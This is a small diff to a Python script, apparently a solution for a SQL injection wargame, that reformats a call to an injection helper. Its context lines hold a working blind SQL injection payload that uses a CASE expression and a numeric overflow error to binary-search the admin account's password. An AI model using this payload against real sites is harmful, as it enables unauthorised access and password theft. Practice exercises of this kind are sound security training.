@@ -49,8 +49,7 @@ def main():
     result = bytearray.fromhex(hex(a)[2:]).decode().lower().strip()
     '''
     payload = f"'||id='admin' and case when pw<%s then 1 else 9e307*2 end#"
-    p = los.SqlInjection(url, cook, method, inj_param, payload,
-                         other_param=other_param)
+    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
     result = p.one_binary(check_func, left=0x0, right=b, mode='hex')
 
     p.payload = bytearray.fromhex(hex(result)[2:]).decode().lower().strip()
